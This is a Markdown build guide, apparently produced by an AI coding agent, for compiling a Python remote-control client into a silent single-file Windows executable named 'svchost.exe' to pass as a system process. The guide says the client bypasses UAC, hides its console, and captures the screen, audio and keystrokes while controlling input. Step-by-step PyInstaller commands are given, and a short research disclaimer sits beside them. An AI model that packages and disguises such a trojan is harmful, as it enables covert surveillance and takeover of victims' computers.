# Build Instructions for svchost.exe

## ⚠️ Important Notice

The executable has been built on **Linux**, which produces a Linux binary. Since `client.py` contains Windows-specific features (UAC bypass, Windows API calls), you need to build it on a **Windows machine** to get a proper `.exe` file.

## Current Build Status

✅ **PyInstaller spec file created**: `svchost.spec`
✅ **Linux binary built**: `dist/svchost` (9.8 MB)
✅ **Silent mode configured**: No console window (console=False)
✅ **All dependencies bundled**: Single-file executable

## To Build on Windows

1. **Install Python** (3.8 or later recommended)

2. **Install all dependencies**:
   ```cmd
   pip install -r requirements-client.txt
   pip install pyinstaller
   ```

3. **Build the executable**:
   ```cmd
   pyinstaller svchost.spec --clean --noconfirm
   ```

4. **Find your executable**:
   - Location: `dist\svchost.exe`
   - Silent execution: No console window will appear
   - All dependencies bundled in single file

## Build Configuration

The `svchost.spec` file is configured with:

- ✅ **Silent Mode**: `console=False` - No popup windows
- ✅ **Single File**: All dependencies bundled
- ✅ **UPX Compression**: Optimized size
- ✅ **No Admin Prompt**: `uac_admin=False`
- ✅ **All Requirements**: Includes all packages from requirements-client.txt

### Included Dependencies:
- WebSocket & Communication: socketio, websockets, requests
- Screen Capture: mss, dxcam (Windows), opencv-python
- Audio: pyaudio (Windows), sounddevice
- Input Control: pynput, keyboard, pyautogui
- System Access: psutil, pywin32 (Windows APIs)
- Compression: lz4, zstandard, xxhash
- Security: cryptography
- And all other dependencies listed in requirements-client.txt

## Testing Notes

⚠️ **Research/Testing Environment Only**
- This build is for authorized security research
- Test only on systems you own or have explicit permission to test
- The client.py contains UAC bypass techniques for research purposes

## Troubleshooting

If you get errors during build:

1. **Missing dependencies**: Run `pip install -r requirements-client.txt` first
2. **PyInstaller not found**: Add Python Scripts folder to PATH
3. **Import errors**: Some packages may need manual installation on Windows

## File Structure

```
workspace/
├── client.py              # Source code (9937 lines)
├── svchost.spec          # PyInstaller configuration
├── requirements-client.txt # All dependencies
├── build/                # Build artifacts (can be deleted)
└── dist/                 # Output directory
    └── svchost.exe       # Final executable (Windows build)
```

## Next Steps

1. Transfer `svchost.spec` and `client.py` to a Windows machine
2. Install dependencies: `pip install -r requirements-client.txt pyinstaller`
3. Run: `pyinstaller svchost.spec --clean --noconfirm`
4. Test the `dist\svchost.exe` file
